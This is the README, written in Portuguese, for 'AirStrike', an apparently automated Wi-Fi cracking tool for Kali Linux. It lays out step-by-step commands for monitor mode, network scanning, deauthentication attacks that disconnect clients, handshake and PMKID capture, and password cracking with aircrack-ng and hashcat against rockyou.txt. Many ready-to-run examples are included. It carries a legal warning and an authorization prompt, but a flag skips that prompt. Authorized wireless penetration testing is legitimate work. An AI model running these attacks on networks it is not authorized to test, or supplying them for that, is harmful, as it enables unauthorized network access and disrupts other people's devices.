# AirStrike

<p align="center">
  <pre>
  -----------------------------------------------------
   ###  ##### ####  ##### ##### ####  ##### #   # #####
  #   #   #   #   # #       #   #   #   #   #  #  #
  #####   #   ####  #####   #   ####    #   ###   ####
  #   #   #   #  #      #   #   #  #    #   #  #  #
  #   #   #   #   #     #   #   #   #   #   #   # #
  #   # ##### #   # #####   #   #   # ##### #   # #####
  -----------------------------------------------------
  </pre>
</p>

**AirStrike** é uma ferramenta estilo Wifite para **Kali Linux** que automatiza os
passos manuais do arquivo `wi-fi hacking.txt`, usando exatamente as mesmas
ferramentas — mais o ataque **PMKID** (hcxtools + hashcat) como alternativa ao
handshake de 4 vias:

| Etapa | Ferramenta | Comando equivalente |
|-------|------------|---------------------|
| 1. Modo monitor | airmon-ng | `sudo airmon-ng check kill && sudo airmon-ng start wlan0` |
| 2. Varredura de redes | airodump-ng | `sudo airodump-ng wlan0mon` |
| 3. Captura da rede alvo | airodump-ng | `sudo airodump-ng -c CANAL --bssid MAC -w captura wlan0mon` |
| 4. Teste de desconexão | aireplay-ng | `sudo aireplay-ng -0 10 -a MAC wlan0mon` |
| 5. Lista de senhas | gzip | `sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz` |
| 6. Descobrir a senha | aircrack-ng | `sudo aircrack-ng -w rockyou.txt captura-01.cap` |
| 6b. Alternativa PMKID | hcxpcapngtool + hashcat | `hcxpcapngtool -o hash.22000 captura-01.cap && hashcat -m 22000 hash.22000 rockyou.txt` |
| 7. Restauração | airmon-ng / NetworkManager | desliga o modo monitor e volta a rede normal |

O script encadeia tudo: ativa o modo monitor, varre as redes, deixa você
escolher o alvo (ou passa `--bssid`), captura os pacotes, faz rodadas de
desconexão até aparecer o **handshake ou o PMKID**, prepara o `rockyou.txt`
se estiver compactado, extrai os hashes no formato 22000 (`hcxpcapngtool`) e
quebra com `hashcat -m 22000` ou `aircrack-ng` — e no final restaura a
interface e o NetworkManager.

> **Aviso legal:** use apenas em redes próprias ou com autorização explícita do
> responsável. O teste de desconexão derruba dispositivos conectados e sem
> autorização isso é crime (Lei 12.737/2012 — "Lei Carolina Dieckmann").
> O script exige que você digite `AUTORIZADO` antes de começar.

## Requisitos

- Kali Linux (ou outra distro com a suite `aircrack-ng`)
- Antena Wi-Fi que suporte **modo monitor** (ex.: ALFA AWUS036ACH)
- Permissões de root (`sudo`)
- Python 3.8+ (biblioteca padrão, sem dependências externas)

```bash
sudo apt update && sudo apt install aircrack-ng
# Opcional, para o ataque PMKID:
sudo apt install hcxtools hashcat
```

Sem o `hcxtools`/`hashcat` o AirStrike funciona normalmente pelo caminho do
handshake (`aircrack-ng`) e apenas avisa que o PMKID está desativado.

## Uso

Copie `airstrike.py` para o Kali e rode com `sudo`:

```bash
chmod +x airstrike.py
sudo python3 airstrike.py
```

O modo interativo mostra a tabela de redes e pede o número do alvo.

### Exemplos não interativos

```bash
# Escolher o alvo pelo BSSID (canal descoberto na varredura)
sudo python3 airstrike.py --bssid AA:BB:CC:DD:EE:FF

# Se a rede não aparecer na varredura, force o canal
sudo python3 airstrike.py --bssid AA:BB:CC:DD:EE:FF --channel 6

# Forçar o caminho PMKID via hashcat (mesmo com handshake disponível)
sudo python3 airstrike.py --bssid AA:BB:CC:DD:EE:FF --cracker hashcat

# Hashcat em CPU com argumentos extras
sudo python3 airstrike.py --bssid AA:BB:CC:DD:EE:FF --hashcat-args "-D 1 --force"

# Interface já em modo monitor, lista de senhas própria, sem deauth
sudo python3 airstrike.py --monitor wlan0mon --wordlist /caminho/senhas.txt --deauth 0

# Só capturar (sem testar senhas) e manter a interface no final
sudo python3 airstrike.py --bssid AA:BB:CC:DD:EE:FF --no-crack --keep
```

### Opções principais

| Opção | Padrão | Descrição |
|-------|--------|-----------|
| `--iface` | auto | interface wireless para o modo monitor |
| `--monitor` | — | interface já em modo monitor (pula o setup) |
| `--scan-time` | 15 | segundos de varredura |
| `--bssid` | — | BSSID do alvo (pula o menu) |
| `--channel` | — | canal do alvo (com `--bssid`, se a varredura não achar) |
| `--wordlist` | rockyou.txt | lista de senhas |
| `--deauth` | 10 | pacotes de desauth por rodada (`0` desativa) |
| `--deauth-interval` | 15 | segundos entre rodadas de deauth |
| `--capture-time` | 180 | tempo máximo de captura em segundos |
| `--iv-target` | 20000 | IVs mínimos antes de tentar WEP |
| `--cracker` | auto | quebrador WPA: `auto`, `aircrack` ou `hashcat` |
| `--hashcat-args` | — | argumentos extras do hashcat entre aspas |
| `--out` | `captures` | pasta das capturas e resultados |
| `--no-crack` | — | para após a captura |
| `--keep` | — | não restaura a interface ao final |
| `--yes` / `-y` | — | pula o aviso de autorização (você atesta que tem autorização) |

Com `--cracker auto` (padrão): se o `hcxpcapngtool` extrair algum hash
PMKID/EAPOL e o `hashcat` estiver instalado, a quebra é feita via
`hashcat -m 22000`; caso contrário, usa o `aircrack-ng` no `.cap`.

## Saídas

Tudo fica na pasta `captures/` (ou a indicada em `--out`):

- `scan_*.csv` — resultado da varredura
- `captura_*.cap` / `captura_*.csv` — pacotes capturados da rede alvo
- `captura_*.22000` — hashes PMKID/EAPOL extraídos no formato hashcat 22000
- `captura_*_chave.txt` — chave gravada pelo `aircrack-ng -l` / `hashcat --outfile`
- `resultado_*.txt` — resumo (data, BSSID, ESSID, chave)

## Dicas

- **PMKID vs handshake:** o PMKID (`WPA*01*`) aparece no primeiro EAPOL do AP
  e não exige completar as 4 mensagens — útil em redes com poucos clientes.
  Com a captura do AirStrike ele é detectado automaticamente; para caçá-lo de
  forma mais agressiva use `hcxdumptool` e importe o `.pcapng` com
  `hcxpcapngtool`.
- **WPA/WPA2:** a quebra depende de handshake ou PMKID. Mantenha um dispositivo
  conectado à rede (celular, notebook) e use um valor maior em
  `--capture-time` se a rede for movimentada.
- **WPA3/SAE e 802.1X (enterprise):** não são quebráveis por wordlist — o
  AirStrike avisa quando detecta.
- **WEP:** sem wordlist; o `aircrack-ng` recupera a chave a partir dos IVs
  (use `--iv-target` para ajustar o mínimo).
- Se o `rockyou.txt` não existir, ele é descompactado do `.gz` automaticamente
  (`gzip -dk`, mantém o original).
- Para tentar outra lista sem refazer a captura:
  ```bash
  sudo aircrack-ng -w outra_lista.txt -b AA:BB:CC:DD:EE:FF captures/captura_XXXX-01.cap
  sudo hashcat -m 22000 captures/captura_XXXX.22000 outra_lista.txt
  ```

## Testes

```bash
python3 test_airstrike.py
```

Testa o parser de CSV do airodump-ng, a contagem de hashes 22000, o banner e a
linha de comando (não executa ataques).
